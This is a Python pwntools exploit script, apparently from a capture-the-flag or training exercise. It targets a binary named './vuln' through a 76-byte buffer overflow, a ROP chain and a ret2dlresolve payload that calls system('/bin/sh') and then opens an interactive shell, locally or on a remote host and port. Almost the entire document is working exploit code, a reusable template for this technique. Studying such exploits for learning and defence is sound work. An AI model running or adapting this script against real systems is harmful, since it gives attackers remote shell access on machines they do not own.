#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4545)

elf = context.binary = ELF('./vuln')
# lib = ELF("./lib.so.6")

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

io = start()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

io.sendline(rop.chain())
io.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

io.interactive()
